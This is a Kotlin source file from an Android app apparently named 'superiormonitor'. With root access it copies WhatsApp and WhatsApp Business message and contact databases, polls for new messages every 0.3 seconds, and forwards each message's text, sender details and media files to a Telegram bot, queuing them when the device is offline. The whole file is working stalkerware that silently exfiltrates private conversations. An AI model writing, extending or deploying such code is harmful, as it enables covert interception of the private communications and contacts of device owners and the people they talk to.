package com.system.superiormonitor.monitor

import com.system.superiormonitor.core.LogLevel

import android.content.Context
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.system.superiormonitor.bot.TelegramApi

/**
 * Native Kotlin port of the Python WhatsApp database monitor (sql2.py).
 *
 * Architecture:
 *   stat-polling shell → Flow → debounce(1500ms) → sync DB → query → format → Telegram
 *
 * Lifecycle is strictly tied to the parent coroutine scope (BotService).
 * When stop() is called or the scope is cancelled, the root watcher process is killed.
 */
enum class WhatsAppVariant(val packageName: String, val logTag: String, val dirName: String) {
    NORMAL("com.whatsapp", "WhatsAppMonitor", "whatsapp"),
    BUSINESS("com.whatsapp.w4b", "WABusinessMonitor", "wabusiness")
}

class WhatsAppMonitor(
    private val context: Context,
    private val variant: WhatsAppVariant,
    private val sendTelegram: (String, String?) -> Boolean
) {
    companion object {
        private const val DEBOUNCE_MS = 1500L
        private const val POLL_INTERVAL = "0.3"

        /**
         * Dynamically resolves WhatsApp's database directory via root.
         * Tries multiple strategies to handle OEM path differences.
         * Returns the resolved path, or the default fallback.
         */
        fun resolveWhatsAppDbDir(variant: WhatsAppVariant): String {
            val packageName = variant.packageName
            val defaultDbDir = "/data/data/$packageName/databases"
            // Strategy 1: Use dumpsys to find the actual dataDir
            try {
                val result = Shell.cmd("dumpsys package $packageName | grep 'dataDir='").exec()
                if (result.isSuccess) {
                    val dataDir = result.out
                        .firstOrNull { it.contains("dataDir=") }
                        ?.trim()
                        ?.substringAfter("dataDir=")
                        ?.trim()
                    if (!dataDir.isNullOrBlank()) {
                        val dbDir = "$dataDir/databases"
                        val check = Shell.cmd("ls $dbDir/msgstore.db 2>/dev/null").exec()
                        if (check.isSuccess && check.out.isNotEmpty()) {
                            return dbDir
                        }
                    }
                }
            } catch (_: Exception) { }

            // Strategy 2: Check common alternative paths
            val alternativePaths = listOf(
                "/data/user/0/$packageName/databases",
                "/data/data/$packageName/databases"
            )
            for (path in alternativePaths) {
                try {
                    val check = Shell.cmd("ls $path/msgstore.db 2>/dev/null").exec()
                    if (check.isSuccess && check.out.isNotEmpty()) {
                        return path
                    }
                } catch (_: Exception) { }
            }

            // Fallback: return default
            return defaultDbDir
        }
        
        fun resolveWhatsAppMediaDir(context: Context, variant: WhatsAppVariant): String {
            val packageName = variant.packageName
            val folderName = if (variant == WhatsAppVariant.NORMAL) "WhatsApp" else "WhatsApp Business"
            val rootStorage = android.os.Environment.getExternalStorageDirectory().absolutePath
            
            val modernPath = "$rootStorage/Android/media/$packageName/$folderName/" // Note: DB file_path starts with 'Media/'
            val legacyPath = "$rootStorage/$folderName/"
            
            // Foolproof check for Custom ROMs / Backups
            if (java.io.File(modernPath).exists()) {
                return modernPath
            } else if (java.io.File(legacyPath).exists()) {
                return legacyPath
            }
            
            // Root fallback if standard java.io.File checks fail (e.g., SELinux policies)
            val modernCheck = Shell.cmd("test -d \"$modernPath\"").exec()
            if (modernCheck.isSuccess) return modernPath
            
            val legacyCheck = Shell.cmd("test -d \"$legacyPath\"").exec()
            if (legacyCheck.isSuccess) return legacyPath

            // Ultimate fallback (Android 11+ defaults to scoped storage)
            return if (android.os.Build.VERSION.SDK_INT >= 30) modernPath else legacyPath
        }

        /**
         * Checks if WhatsApp is installed on the device using root shell
         * to bypass Android 11+ package visibility restrictions.
         */
        fun isWhatsAppInstalled(context: Context, variant: WhatsAppVariant): Boolean {
            val packageName = variant.packageName
            return try {
                val result = Shell.cmd("pm path $packageName").exec()
                result.isSuccess && result.out.any { it.contains("package:") }
            } catch (e: Exception) {
                // Fallback to PackageManager
                try {
                    context.packageManager.getPackageInfo(packageName, 0)
                    true
                } catch (e2: Exception) {
                    false
                }
            }
        }

        /**
         * Checks if WhatsApp database files exist (requires root).
         * Uses dynamic path resolution.
         * Returns a pair: (available: Boolean, reason: String)
         */
        fun checkWhatsAppDatabase(variant: WhatsAppVariant): Pair<Boolean, String> {
            return try {
                val dbDir = resolveWhatsAppDbDir(variant)
                val result = Shell.cmd("ls $dbDir/msgstore.db 2>/dev/null").exec()
                if (result.isSuccess && result.out.isNotEmpty()) {
                    Pair(true, "Database found at $dbDir")
                } else {
                    Pair(false, "${variant.logTag} database files were not found. App may not have been opened yet, or the data directory is inaccessible.")
                }
            } catch (e: Exception) {
                Pair(false, "Unable to verify ${variant.logTag} database: ${e.message}")
            }
        }

        // Modern schema with jid_map (LID resolution)
        const val MODERN_QUERY = """
            SELECT
                m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                COALESCE(mapped_cj.raw_string, cj.raw_string) AS chat_jid,
                COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid,
                mm.file_path, mm.file_size, mm.mime_type
            FROM message m
            JOIN chat c ON m.chat_row_id = c._id
            JOIN jid cj ON c.jid_row_id = cj._id
            LEFT JOIN jid_map cjm ON cj._id = cjm.lid_row_id
            LEFT JOIN jid mapped_cj ON cjm.jid_row_id = mapped_cj._id
            LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
            LEFT JOIN jid_map sjm ON sj._id = sjm.lid_row_id
            LEFT JOIN jid mapped_sj ON sjm.jid_row_id = mapped_sj._id
            LEFT JOIN message_media mm ON m._id = mm.message_row_id
            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
            ORDER BY m._id ASC
        """

        // Legacy schema without jid_map table
        const val LEGACY_QUERY = """
            SELECT
                m._id, m.timestamp, m.from_me, m.text_data, m.message_type,
                cj.raw_string AS chat_jid,
                sj.raw_string AS sender_jid,
                mm.file_path, mm.file_size, mm.mime_type
            FROM message m
            JOIN chat c ON m.chat_row_id = c._id
            JOIN jid cj ON c.jid_row_id = cj._id
            LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
            LEFT JOIN message_media mm ON m._id = mm.message_row_id
            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
            ORDER BY m._id ASC
        """
    }

    private val workDir: File by lazy {
        val dir = File(context.filesDir, "${variant.dirName}/watchdir")
        dir.also { if (!it.exists()) it.mkdirs() }
    }

    private var contactsMap: Map<String, String> = emptyMap()
    private val prefsManager by lazy { com.system.superiormonitor.data.PrefsManager.getInstance(context) }
    private val mediaUploadMutex = Mutex()
    
    private data class QueuedMedia(
        val file: File,
        val isVideoOrAudio: Boolean,
        val mimeType: String,
        val caption: String,
        val row: MessageRow
    )
    private var watcherJob: Job? = null
    private var waDbDir: String = ""  // Resolved dynamically on start()
    private var currentScope: CoroutineScope? = null
    
    private var lastProcessedId: Long
        get() = if (variant == WhatsAppVariant.NORMAL) prefsManager.whatsappLastProcessedId else prefsManager.whatsappBusinessLastProcessedId
        set(value) {
            if (variant == WhatsAppVariant.NORMAL) {
                prefsManager.whatsappLastProcessedId = value
            } else {
                prefsManager.whatsappBusinessLastProcessedId = value
            }
        }

    // ═══════════════════════════════════════════════════════════
    //  PUBLIC API
    // ═══════════════════════════════════════════════════════════

    private fun queueMediaForUpload(context: Context, variant: WhatsAppVariant, media: QueuedMedia) {
        com.system.superiormonitor.core.BatchManager.queue("wa_media_${variant.name}", media, 8000L, 10) { batch ->
            mediaUploadMutex.withLock {
                val token = prefsManager.botToken
                val chatId = prefsManager.chatId
                if (token.isBlank() || chatId.isBlank()) return@withLock
                
                val offlineParentDir = File(context.getExternalFilesDir(null), "${variant.dirName}/offline")
                val mediaDir = File(offlineParentDir, "media")
                if (!mediaDir.exists()) mediaDir.mkdirs()
                
                // 1. Move ALL batch items to offline/media folder IMMEDIATELY
                for (item in batch) {
                    val destFile = File(mediaDir, item.file.name)
                    try {
                        item.file.copyTo(destFile, overwrite = true)
                        item.file.delete()
                    } catch (e: Exception) {
                        LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to move ${item.file.name} to offline media", LogLevel.ERROR)
                    }
                }
                
                if (!com.system.superiormonitor.bot.TelegramApi.isApiReachable(context, token)) {
                    // Offline: Leave files in offline/media/ and let OfflineManager do the job when device becomes online
                    return@withLock
                }
                
                // Online: Trigger the centralized offline folder processor
                val logPrefix = if (variant == WhatsAppVariant.NORMAL) "WA" else "WA Business"
                com.system.superiormonitor.core.ZipManager.processOfflineMediaFolder(
                    context, token, chatId, mediaDir, offlineParentDir, logPrefix
                )
            }
        }
    }

    fun start(scope: CoroutineScope) {
        if (watcherJob?.isActive == true) return // Prevent double start
        currentScope = scope

        watcherJob = scope.launch(Dispatchers.IO) {
            try {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Starting ${variant.logTag} monitor...")

                // 0. Fail-safe: Check if WhatsApp is installed
                if (!isWhatsAppInstalled(context, variant)) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] ${variant.logTag} is not installed on this device. Monitor aborted.")
                    return@launch
                }

                // 0b. Fail-safe: Check if database files are accessible
                val (dbAvailable, dbReason) = checkWhatsAppDatabase(variant)
                if (!dbAvailable) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] $dbReason. Monitor aborted.")
                    return@launch
                }

                // 0c. Resolve the actual database path for this device
                waDbDir = resolveWhatsAppDbDir(variant)
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Resolved ${variant.logTag} DB path: $waDbDir")

                // 1. Load contacts once at startup
                if (contactsMap.isEmpty()) {
                    contactsMap = loadContacts()
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Loaded ${contactsMap.size} contacts into memory.")
                }

                // 2. Establish or Catch-up baseline
                syncDatabase()
                val currentMaxId = getMaxMessageId()
                
                if (lastProcessedId > currentMaxId) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Database wipe detected (Stored: $lastProcessedId, Current Max: $currentMaxId). Resetting baseline.")
                }

                // Universally establish a fresh baseline upon startup
                lastProcessedId = currentMaxId
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Baseline established (ID: $lastProcessedId). Watching for live messages...")

                // 3. Start the watcher flow
                createWatcherFlow()
                    .debounce(DEBOUNCE_MS)
                    .collect {
                        try {
                            processNewMessages()
                        } catch (e: CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error processing messages: ${e.message}", LogLevel.ERROR)
                        }
                    }
            } catch (e: CancellationException) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Monitor cancelled.")
            } catch (e: Exception) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Fatal error: ${e.message}", LogLevel.ERROR)
            }
        }
    }

    fun stop() {
        watcherJob?.cancel()
        watcherJob = null
        LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Monitor stopped.")
    }

    // ═══════════════════════════════════════════════════════════
    //  WATCHER — stat-polling shell via libsu
    //  Ports: start_smart_watcher() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun createWatcherFlow(): Flow<Unit> = flow {
        val walPath = "$waDbDir/msgstore.db-wal"

        LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Starting native Kotlin stat polling every ${POLL_INTERVAL}s.")

        // Initial baseline
        var lastStat = Shell.cmd("stat -c '%Y' $walPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()

        while (currentCoroutineContext().isActive) {
            val currentStat = Shell.cmd("stat -c '%Y' $walPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()

            if (currentStat.isNotEmpty() && currentStat != "0" && currentStat != lastStat) {
                lastStat = currentStat
                emit(Unit)
            }

            delay((POLL_INTERVAL.toDouble() * 1000).toLong())
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  DATABASE SYNC — Root copy + SHM deletion
    //  Ports: sync_db() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun syncDatabase() {
        val destPath = workDir.absolutePath
        val uid = android.os.Process.myUid()

        val result = Shell.cmd(
            "rm -f $destPath/msgstore.db*",
            "cp $waDbDir/msgstore.db $destPath/msgstore.db",
            "cp $waDbDir/msgstore.db-wal $destPath/msgstore.db-wal 2>/dev/null || true",
            "cp $waDbDir/msgstore.db-shm $destPath/msgstore.db-shm 2>/dev/null || true",
            "chown $uid:$uid $destPath/msgstore.db*",
            "chmod 666 $destPath/msgstore.db $destPath/msgstore.db-wal $destPath/msgstore.db-shm 2>/dev/null || true"
        ).exec()

        if (!result.isSuccess) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] DB sync failed: ${result.err.joinToString()}", LogLevel.ERROR)
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  CONTACT LOADER
    //  Ports: load_contacts() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private suspend fun loadContacts(): Map<String, String> {
        val contacts = mutableMapOf<String, String>()
        val destPath = workDir.absolutePath
        val uid = android.os.Process.myUid()

        try {
            val copyResult = Shell.cmd(
                "rm -f $destPath/wa.db*",
                "cp $waDbDir/wa.db $destPath/wa.db 2>/dev/null || cp $waDbDir/../databases/wa.db $destPath/wa.db 2>/dev/null || cp /data/data/${variant.packageName}/databases/wa.db $destPath/wa.db",
                "chown $uid:$uid $destPath/wa.db*",
                "chmod 666 $destPath/wa.db"
            ).exec()

            if (!copyResult.isSuccess) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Warning: Could not copy wa.db for contacts.")
                return contacts
            }

            val waDbFile = File(workDir, "wa.db")
            if (!waDbFile.exists()) return contacts

            val db = try {
                SQLiteDatabase.openDatabase(
                    waDbFile.absolutePath,
                    null,
                    SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
                )
            } catch (e: Exception) {
                SQLiteDatabase.openDatabase(
                    waDbFile.absolutePath,
                    null,
                    SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
                )
            }

            db.use { database ->
                val cursor = database.rawQuery(
                    "SELECT jid, display_name, wa_name FROM wa_contacts", null
                )
                cursor.use { c ->
                    while (c.moveToNext()) {
                        kotlinx.coroutines.yield()
                        val jid = c.getString(0) ?: continue
                        val name = c.getString(1) ?: c.getString(2) ?: continue
                        if (jid.isNotBlank() && name.isNotBlank()) {
                            contacts[jid] = name
                        }
                    }
                }
            }

            waDbFile.delete()
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error: Could not load contacts. (${e.message})", LogLevel.ERROR)
        }

        return contacts
    }

    // ═══════════════════════════════════════════════════════════
    //  JID PARSER
    //  Ports: parse_jid() from Python PoC exactly
    // ═══════════════════════════════════════════════════════════

    data class ParsedJid(val name: String, val number: String?, val chatType: String)

    private fun parseJid(rawJid: String?): ParsedJid {
        if (rawJid.isNullOrBlank()) return ParsedJid("Unknown", null, "Unknown")

        val parts = rawJid.split("@", limit = 2)
        val rawId = parts[0]
        val domain = if (parts.size > 1) parts[1] else ""

        // STRIP multi-device suffixes: regex split at ':' or '.'
        val cleanId = rawId.split(Regex("[:\\.]"))[0]
        val baseJid = "$cleanId@$domain"

        val knownName = contactsMap[baseJid] ?: contactsMap[rawJid]

        return when (domain) {
            "g.us" -> ParsedJid(
                name = knownName ?: "Unnamed Group",
                number = null,
                chatType = "Group"
            )
            "lid" -> ParsedJid(
                name = knownName ?: "Hidden Contact",
                number = "LID: $cleanId",
                chatType = "Community / Hidden"
            )
            "broadcast" -> ParsedJid(
                name = "Status / Broadcast",
                number = null,
                chatType = "Broadcast"
            )
            else -> ParsedJid(
                name = knownName ?: "Unsaved Number",
                number = "+$cleanId",
                chatType = "Direct Message"
            )
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  TIME FORMATTER
    //  Ports: format_time_12hr() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private val timeFormatter = SimpleDateFormat("hh:mm:ss a | dd/MM/yyyy", Locale.US)

    private fun formatTime12Hr(timestamp: Long?): String {
        if (timestamp == null || timestamp == 0L) return "Unknown Time"
        // WhatsApp stores timestamps in milliseconds
        val ts = if (timestamp > 1_000_000_000_000L) timestamp else timestamp * 1000L
        return timeFormatter.format(Date(ts))
    }

    // ═══════════════════════════════════════════════════════════
    //  MAX MESSAGE ID
    //  Ports: max_message_id() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun getMaxMessageId(): Long {
        val dbFile = File(workDir, "msgstore.db")
        if (!dbFile.exists()) return 0

        return try {
            val db = try {
                SQLiteDatabase.openDatabase(
                    dbFile.absolutePath, null,
                    SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
                )
            } catch (e: Exception) {
                SQLiteDatabase.openDatabase(
                    dbFile.absolutePath, null,
                    SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
                )
            }
            db.use { database ->
                val cursor = database.rawQuery("SELECT COALESCE(MAX(_id), 0) FROM message", null)
                cursor.use { c ->
                    if (c.moveToFirst()) c.getLong(0) else 0L
                }
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Error reading max ID: ${e.message}", LogLevel.ERROR)
            0L
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  MAIN PROCESSING PIPELINE
    //  Ports: print_new_rows() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private suspend fun processNewMessages() {
        // Let the SQLite WAL file finish its micro-writes (matches Python's time.sleep(0.15))
        Thread.sleep(150)

        syncDatabase()

        val dbFile = File(workDir, "msgstore.db")
        if (!dbFile.exists()) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] msgstore.db not found after sync.", LogLevel.ERROR)
            return
        }

        val db = try {
            SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null,
                SQLiteDatabase.OPEN_READWRITE or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )
        } catch (e: Exception) {
            SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null,
                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )
        }

        db.use { database ->
            val rows = queryNewMessages(database)

            for (row in rows) {
                if (row.id > lastProcessedId) {
                    var formatted = formatOutputMessage(row)
                    var processedMedia = false

                    // If it's a media message (or has a file path)
                    if (row.messageType in listOf(1, 2, 3, 9, 13, 20) || !row.filePath.isNullOrBlank()) {
                        if (row.filePath.isNullOrBlank()) {
                            formatted += "\n\n[Media Not Downloaded on Device]"
                            LogManager.log(LogCategory.SOCIAL_UPDATE, "Media empty file_path for msg ${row.id}")
                        } else {
                            val mediaBaseDir = resolveWhatsAppMediaDir(context, variant)
                            val absolutePath = if (row.filePath.startsWith("/")) {
                                row.filePath
                            } else {
                                "$mediaBaseDir${row.filePath}"
                            }
                            
                            LogManager.log(LogCategory.SOCIAL_UPDATE, "Media Extraction -> msg_id: ${row.id}, raw_path: ${row.filePath}, absolute: $absolutePath")
                            
                            // Check size (10MB limit)
                            val fileSize = row.fileSize ?: 0L
                            if (fileSize > 10 * 1024 * 1024) {
                                formatted += "\n\n[Media Exceeds 10MB Limit - Skipped]"
                            } else {
                                // Extract and upload
                                try {
                                    val checkFile = Shell.cmd("ls \"$absolutePath\" 2>/dev/null").exec()
                                    if (checkFile.isSuccess && checkFile.out.isNotEmpty()) {
                                        val tempFile = File(context.cacheDir, "wa_media_${row.id}_${File(row.filePath).name}")
                                        val copyRes = Shell.cmd("cp \"$absolutePath\" \"${tempFile.absolutePath}\" && chmod 777 \"${tempFile.absolutePath}\"").exec()
                                        
                                        if (copyRes.isSuccess && tempFile.exists()) {
                                            processedMedia = true
                                            
                                            val isVideoOrAudio = row.messageType == 3 || row.messageType == 2 || row.messageType == 9
                                            val queuedItem = QueuedMedia(
                                                file = tempFile,
                                                isVideoOrAudio = isVideoOrAudio,
                                                mimeType = row.mimeType ?: "application/octet-stream",
                                                caption = formatted,
                                                row = row
                                            )
                                            queueMediaForUpload(context, variant, queuedItem)
                                        } else {
                                            formatted += "\n\n[Failed to extract media from root]"
                                        }
                                    } else {
                                        formatted += "\n\n[Media Not Downloaded on Device]"
                                    }
                                } catch (e: Exception) {
                                    formatted += "\n\n[Error Extracting Media: ${e.message}]"
                                }
                            }
                        }
                    }

                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
                        context = context,
                        message = formatted,
                        offlineSubdir = variant.dirName,
                        offlineFileName = "offline_${variant.dirName}.txt",
                        sender = sendTelegram
                    )
                    
                    lastProcessedId = row.id
                }
            }

            if (rows.isNotEmpty()) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Forwarded/Queued ${rows.size} new message(s).")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  SQL QUERIES — Modern (jid_map) + Legacy fallback
    // ═══════════════════════════════════════════════════════════

    private data class MessageRow(
        val id: Long,
        val timestamp: Long,
        val fromMe: Int,
        val textData: String?,
        val messageType: Int,
        val chatJid: String?,
        val senderJid: String?,
        val filePath: String?,
        val fileSize: Long?,
        val mimeType: String?
    )

    private suspend fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
        // Try modern query with jid_map joins first
        try {
            return executeQuery(db, MODERN_QUERY)
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Modern query failed, falling back to legacy. (${e.message})")
        }

        // Fallback: older schema without jid_map
        try {
            return executeQuery(db, LEGACY_QUERY)
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[${variant.logTag}] Legacy query also failed: ${e.message}", LogLevel.ERROR)
        }

        return emptyList()
    }

    private suspend fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
        val rows = mutableListOf<MessageRow>()
        val cursor = db.rawQuery(query, arrayOf(lastProcessedId.toString()))

        cursor.use { c ->
            while (c.moveToNext()) {
                kotlinx.coroutines.yield()
                val fpIdx = c.getColumnIndex("file_path")
                val fsIdx = c.getColumnIndex("file_size")
                val mtIdx = c.getColumnIndex("mime_type")
                
                rows.add(
                    MessageRow(
                        id = c.getLong(c.getColumnIndexOrThrow("_id")),
                        timestamp = c.getLong(c.getColumnIndexOrThrow("timestamp")),
                        fromMe = c.getInt(c.getColumnIndexOrThrow("from_me")),
                        textData = c.getString(c.getColumnIndexOrThrow("text_data")),
                        messageType = c.getInt(c.getColumnIndexOrThrow("message_type")),
                        chatJid = c.getString(c.getColumnIndexOrThrow("chat_jid")),
                        senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid")),
                        filePath = if (fpIdx != -1) c.getString(fpIdx) else null,
                        fileSize = if (fsIdx != -1 && !c.isNull(fsIdx)) c.getLong(fsIdx) else null,
                        mimeType = if (mtIdx != -1) c.getString(mtIdx) else null
                    )
                )
            }
        }

        return rows
    }

    // ═══════════════════════════════════════════════════════════
    //  OUTPUT FORMATTER
    //  Ports: the exact markdown structure from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun formatOutputMessage(row: MessageRow, overrideMsg: String? = null): String {
        val direction = if (row.fromMe == 1) "Sent" else "Received"
        val msg = overrideMsg ?: if (row.textData.isNullOrBlank()) {
            when (row.messageType) {
                8, 10, 90 -> "[📞 WhatsApp Call]"
                1, 42 -> "[🖼️ Image Media]"
                2, 43 -> "[🎵 Audio Media]"
                3, 44 -> "[🎥 Video Media]"
                4 -> "[👤 Contact Card]"
                5 -> "[📍 Location]"
                9 -> "[📄 Document / File]"
                15 -> "[🗑️ Deleted Message]"
                else -> if (!row.filePath.isNullOrBlank()) "[📁 Media File]" else "[Non-text message]"
            }
        } else {
            row.textData
        }
        val timeFormatted = formatTime12Hr(row.timestamp)

        val chatParsed = parseJid(row.chatJid)

        val sentBy: String
        val toTarget: String

        if (row.fromMe == 1) {
            sentBy = "Me"
            toTarget = if (chatParsed.chatType == "Direct Message") {
                chatParsed.number ?: chatParsed.name
            } else {
                chatParsed.name
            }
        } else {
            val actualSenderJid = if (!row.senderJid.isNullOrBlank()) row.senderJid else row.chatJid
            val senderParsed = parseJid(actualSenderJid)

            sentBy = if (chatParsed.chatType == "Direct Message" && senderParsed.name == "Unsaved Number") {
                senderParsed.number ?: senderParsed.name
            } else {
                if (senderParsed.number != null) "${senderParsed.name} (${senderParsed.number})" else senderParsed.name
            }
            toTarget = "Me"
        }

        val safeChatName = TelegramApi.escapeMarkdown(chatParsed.name)
        val safeChatType = TelegramApi.escapeMarkdown(chatParsed.chatType)
        val safeSentBy = TelegramApi.escapeMarkdown(sentBy)
        val safeToTarget = TelegramApi.escapeMarkdown(toTarget)
        val safeMsg = TelegramApi.escapeMarkdown(msg)

        // Exact markdown structure from Python PoC
        return if (variant == WhatsAppVariant.NORMAL) {
            com.system.superiormonitor.bot.BotMessages.Alerts.buildWhatsAppMessage(
                safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
            )
        } else {
            com.system.superiormonitor.bot.BotMessages.Alerts.buildWABusinessMessage(
                safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
            )
        }
    }
}

